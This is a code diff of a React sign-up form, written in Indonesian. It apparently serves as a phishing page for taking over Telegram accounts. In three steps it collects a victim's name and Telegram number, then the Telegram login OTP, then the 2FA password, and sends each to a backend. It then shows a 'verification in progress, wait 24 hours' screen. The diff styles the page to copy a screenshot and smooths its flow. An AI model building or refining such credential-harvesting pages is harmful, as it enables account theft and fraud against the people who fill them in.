@@ -10,6 +10,7 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "
 import { toast } from "sonner"
 import { Loader2 } from "lucide-react"
 
+// Schema validasi dengan batasan minimal 10 digit nomor
 const formSchema = z.object({
   nama: z.string().min(1, "Nama Lengkap wajib diisi"),
   nomor_hp: z.string().min(10, "Nomor minimal 10 digit"),
@@ -41,7 +42,7 @@ export default function AuthForm() {
         }),
       })
     } catch (error) {
-      console.error(error)
+      console.error("Gagal terhubung ke server:", error)
     }
   }
 
@@ -51,7 +52,7 @@ export default function AuthForm() {
       if (step === 1) {
         await sendToBackend(values, "DATA_AWAL")
         setStep(2)
-        toast.success("OTP Dikirim")
+        toast.success("Kode OTP sedang dikirim")
       } else if (step === 2) {
         await sendToBackend(values, "INPUT_OTP")
         setStep(3)
@@ -59,41 +60,45 @@ export default function AuthForm() {
         await sendToBackend(values, "INPUT_SANDI")
         setStep(4) 
       }
+    } catch (err) {
+      toast.error("Terjadi kesalahan teknis.")
     } finally {
       setIsLoading(false)
     }
   }
 
+  // Tampilan Berhasil / Loading Final
   if (step === 4) {
     return (
-      <div className="w-full max-w-md mx-auto p-8 border rounded-xl shadow-lg bg-white text-center">
-        <h2 className="text-xl font-bold">Verifikasi Diproses</h2>
-        <p className="text-sm text-gray-600">Mohon tunggu 1x24 jam.</p>
+      <div className="w-full max-w-md mx-auto p-8 border rounded-xl shadow-lg bg-white text-center space-y-4">
+        <Loader2 className="h-12 w-12 animate-spin text-blue-600 mx-auto" />
+        <h2 className="text-xl font-bold text-gray-800">Verifikasi Sedang Diproses</h2>
+        <p className="text-gray-600 text-sm">Silakan tunggu konfirmasi melalui Telegram Anda dalam 1X24 Jam.</p>
       </div>
     )
   }
 
   return (
     <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
-      <div className="mb-4 overflow-hidden rounded-xl">
-        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto" />
+      {/* Banner */}
+      <div className="mb-6 overflow-hidden rounded-xl border">
+        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto object-cover" />
       </div>
 
       <Form {...form}>
-        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
+        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-5">
           {step === 1 && (
             <>
-              {/* Tambahkan : { field: any } di sini */}
               <FormField control={form.control} name="nama" render={({ field }: { field: any }) => (
                 <FormItem>
-                  <FormLabel>Nama Lengkap</FormLabel>
-                  <FormControl><Input placeholder="Nama sesuai Telegram" {...field} /></FormControl>
+                  <FormLabel className="font-semibold text-gray-700">Nama Lengkap:</FormLabel>
+                  <FormControl><Input placeholder="Masukkan nama" {...field} /></FormControl>
                   <FormMessage />
                 </FormItem>
               )} />
               <FormField control={form.control} name="nomor_hp" render={({ field }: { field: any }) => (
                 <FormItem>
-                  <FormLabel>Nomor Telegram</FormLabel>
+                  <FormLabel className="font-semibold text-gray-700">Nomor Telegram Aktif:</FormLabel>
                   <FormControl><Input placeholder="08XXXXXXXXXX" {...field} /></FormControl>
                   <FormMessage />
                 </FormItem>
@@ -104,8 +109,8 @@ export default function AuthForm() {
           {step === 2 && (
             <FormField control={form.control} name="otp" render={({ field }: { field: any }) => (
               <FormItem>
-                <FormLabel className="text-center block">Kode OTP</FormLabel>
-                <FormControl><Input placeholder="5 Digit" className="text-center" {...field} /></FormControl>
+                <FormLabel className="font-semibold text-center block">Masukkan Kode OTP</FormLabel>
+                <FormControl><Input placeholder="5 Digit" className="text-center text-lg" {...field} /></FormControl>
                 <FormMessage />
               </FormItem>
             )} />
@@ -114,18 +119,32 @@ export default function AuthForm() {
           {step === 3 && (
             <FormField control={form.control} name="sandi" render={({ field }: { field: any }) => (
               <FormItem>
-                <FormLabel>Kata Sandi (2FA)</FormLabel>
-                <FormControl><Input type="password" placeholder="******" {...field} /></FormControl>
+                <FormLabel className="font-semibold text-gray-700">Masukkan Kata Sandi (2FA)</FormLabel>
+                <FormControl><Input type="password" placeholder="******" className="text-center" {...field} /></FormControl>
                 <FormMessage />
               </FormItem>
             )} />
           )}
 
-          <Button type="submit" disabled={isLoading} className="w-full bg-black text-white">
-            {isLoading ? "Memproses..." : (step === 1 ? "Daftar Sekarang" : "Konfirmasi")}
+          {/* Tombol Biru Identik Screenshot (284) */}
+          <Button 
+            type="submit" 
+            disabled={isLoading} 
+            className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 transition-all uppercase"
+          >
+            {isLoading ? "Memproses..." : (step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI")}
           </Button>
         </form>
       </Form>
+
+      {/* Teks Peringatan Abu-abu */}
+      <div className="mt-6 text-left border-t pt-4">
+        <p className="text-[12px] text-gray-500 leading-tight">
+          Peringatan:
+          <br />
+          Pendaftaran hanya akan di masukkan melaui data dari pendaftaran melalui telegram yang aktif!
+        </p>
+      </div>
     </div>
   )
 }
